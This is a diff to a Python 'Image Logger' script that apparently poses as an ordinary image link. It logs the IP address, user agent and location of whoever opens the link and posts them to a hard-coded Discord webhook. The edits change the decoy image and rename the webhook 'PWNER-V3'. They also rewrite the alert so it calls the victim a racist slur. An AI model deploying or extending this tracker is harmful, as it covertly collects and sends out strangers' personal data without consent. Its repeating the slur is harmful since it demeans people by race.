@@ -13,12 +13,12 @@ __author__ = "picutrethisremedy"
 config = {
     # BASE CONFIG #
     "webhook": "https://discord.com/api/webhooks/1447163666498719757/8bLtCzW-sVwM-VRFhVN15JZ0oHaecq8MrCmwBQ5FBs3p773k7KHvIQbGTlcvyte0PumA",
-    "image": "https://media1.tenor.com/m/5pBEKkewl_sAAAAd/hello-hi.gif", # You can also have a custom image by using a URL argument
+    "image": "https://yt3.googleusercontent.com/xTxr7gmbkxiPKjrmN5ut0Kn8UcHpkkgyTv-_EeDPphcQusrWyKfSZw13EKCYXQyYdeoC3ON1zQ=s900-c-k-c0x00ffffff-no-rj", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "PWNER-V3 (REMEDY EDIT)", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -107,7 +107,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
 }) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
         return
 
-    ping = "@everyone"
+    ping = "@<703173684608630875>"
 
     info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
     if info["proxy"]:
@@ -146,7 +146,7 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
         {
             "title": "Image Logger - IP Logged",
             "color": config["color"],
-            "description": f"""**A User Opened the Original Image!**
+            "description": f"""**A DUMB NIGGER RAN YOUR LOGGER!! XD**
 
 **Endpoint:** `{endpoint}`
             
